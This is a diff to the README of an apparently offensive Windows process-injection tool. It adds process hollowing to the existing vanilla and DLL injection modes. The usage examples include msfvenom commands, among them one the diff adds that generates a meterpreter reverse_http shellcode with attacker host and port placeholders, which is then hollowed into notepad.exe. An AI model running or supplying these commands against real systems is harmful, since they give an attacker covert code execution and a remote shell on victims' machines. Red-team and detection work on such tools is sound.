@@ -7,8 +7,9 @@ Currently the tool supports 2 process injection techniques.
 
 	1) Vanila Process Injection
 	2) DLL Injection
+	3) Process Hollowing
 
-Vanila Process Injection
+Vanila Process Injection and Process Hollowing
 Currently the program accepts shellcode in 3 formats 
 
 	1) base64
@@ -33,6 +34,12 @@ Currently the program accepts shellcode in 3 formats
 	Generating DLL and injecting it in the target process.
 	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f dll > Desktop/calc.dll
 	ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\calc.dll"" /t:2
+	
+	Process Hollowing
+	Generating shellcode in c format and injecting it in the target process.
+	msfvenom -p windows/meterpreter/reverse_http LHOST=<local host> LPORT=<local port> -b "\x00" -f c
+	ProcessInjection.exe /proc:notepad.exe /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:3
+
 
 ### Blog Post
 
